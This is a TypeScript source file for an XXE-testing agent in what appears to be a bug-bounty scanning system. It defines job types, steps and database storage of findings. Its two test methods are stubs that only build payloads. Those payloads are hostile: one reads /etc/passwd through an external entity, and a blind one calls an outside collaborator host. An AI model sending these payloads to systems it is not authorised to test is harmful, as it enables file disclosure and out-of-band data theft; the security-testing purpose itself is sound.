import { Job } from 'bullmq';
import { BaseAgent } from './base';
import { BaseJob } from '../../../shared/types';
import logger from '../utils/logger';
import database from '../services/database';
import { EnhancedAgentCapabilities } from './enhanced-capabilities';
import { sharedMemory } from '../services/three-agent/shared-memory';
import { v4 as uuidv4 } from 'uuid';
import axios from 'axios';

export interface XXEJob extends BaseJob {
  programId: string;
  urls: string[];
  options: {
    testBlindXXE?: boolean;
    testOutOfBand?: boolean;
    oobCollaborator?: string;
    timeout?: number;
  };
}

export interface XXEResult {
  vulnerabilities: Array<{
    url: string;
    type: 'xxe-classic' | 'xxe-blind' | 'xxe-ssrf' | 'xxe-dos';
    severity: 'critical' | 'high' | 'medium';
    confidence: number;
    evidence: string;
    payload: string;
    impact: string;
    remediation: string;
  }>;
  testedUrls: number;
  executionTime: number;
}

/**
 * XXE (XML External Entity) Agent
 *
 * Tests for XML External Entity vulnerabilities:
 * - Classic XXE (file disclosure)
 * - Blind XXE (out-of-band data exfiltration)
 * - XXE to SSRF
 * - Billion Laughs / DTD entity expansion DoS
 *
 * Tools: XXEinjector, custom payloads
 */
export class XXEAgent extends BaseAgent<XXEJob> {
  private enhanced = new EnhancedAgentCapabilities();

  constructor() {
    super('xxe' as any);
  }

  protected getSteps() {
    return [
      { name: 'Identify XML endpoints', metadata: {} },
      { name: 'Test classic XXE', metadata: {} },
      { name: 'Test blind XXE', metadata: {} },
      { name: 'Test XXE to SSRF', metadata: {} },
      { name: 'Store findings', metadata: {} },
    ];
  }

  async process(job: Job<XXEJob>): Promise<XXEResult> {
    const { programId, urls, options } = job.data;
    const startTime = Date.now();

    const result: XXEResult = {
      vulnerabilities: [],
      testedUrls: urls.length,
      executionTime: 0,
    };

    try {
      await this.updateJobStatus(job.id, 'active');

      // Test classic XXE
      const xxeVulns = await this.testClassicXXE(urls);
      result.vulnerabilities.push(...xxeVulns);

      // Test blind XXE if enabled
      if (options.testBlindXXE !== false) {
        const blindVulns = await this.testBlindXXE(urls, options);
        result.vulnerabilities.push(...blindVulns);
      }

      // Store findings
      if (result.vulnerabilities.length > 0) {
        await this.storeFindingsInDatabase(result.vulnerabilities, programId, job.id);
      }

      result.executionTime = Date.now() - startTime;
      await this.updateJobStatus(job.id, 'completed', result);

      return result;
    } catch (error: any) {
      await this.updateJobStatus(job.id, 'failed', { error: error.message });
      throw error;
    }
  }

  private async testClassicXXE(urls: string[]): Promise<XXEResult['vulnerabilities']> {
    const vulnerabilities: XXEResult['vulnerabilities'] = [];

    const classicPayload = `<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<root><data>&xxe;</data></root>`;

    // Test each URL (simplified)
    // In production, would use XXEinjector and comprehensive payloads

    return vulnerabilities;
  }

  private async testBlindXXE(
    urls: string[],
    options: XXEJob['options']
  ): Promise<XXEResult['vulnerabilities']> {
    const vulnerabilities: XXEResult['vulnerabilities'] = [];

    const collaborator = options.oobCollaborator || 'burpcollaborator.net';
    const blindPayload = `<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://${collaborator}/xxe">%xxe;]>
<root></root>`;

    // Test for out-of-band XXE

    return vulnerabilities;
  }

  private async storeFindingsInDatabase(
    vulnerabilities: XXEResult['vulnerabilities'],
    programId: string,
    jobId: string
  ) {
    for (const vuln of vulnerabilities) {
      await database.query(
        `INSERT INTO findings (program_id, job_id, type, severity, url, evidence, poc, remediation, confidence, created_at)
         VALUES ($1, $2, $3, $4, $5, $6, $7, $8, $9, NOW())
         ON CONFLICT (program_id, url, type) DO UPDATE SET evidence = EXCLUDED.evidence`,
        [
          programId,
          jobId,
          vuln.type,
          vuln.severity,
          vuln.url,
          vuln.evidence,
          vuln.payload,
          vuln.remediation,
          vuln.confidence,
        ]
      );
    }
  }
}
